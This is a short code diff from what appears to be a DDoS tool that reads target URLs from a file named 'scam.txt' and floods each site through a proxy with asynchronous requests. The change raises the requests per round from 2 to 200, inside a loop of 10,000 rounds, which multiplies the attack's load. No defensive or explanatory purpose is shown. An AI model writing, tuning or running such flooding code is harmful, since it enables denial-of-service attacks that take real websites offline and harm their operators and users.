@@ -48,7 +48,7 @@ def take_urls(file = 'scam.txt'):
 
 def ddos_new_site(url, proxy):
     ddos_site = ddosRussia(url, proxy)
-    ntimes = 2
+    ntimes = 200
     for i in range(10000):
         start_time = time.time()
         resp = asyncio.run(ddos_site.fetch_async(ntimes))
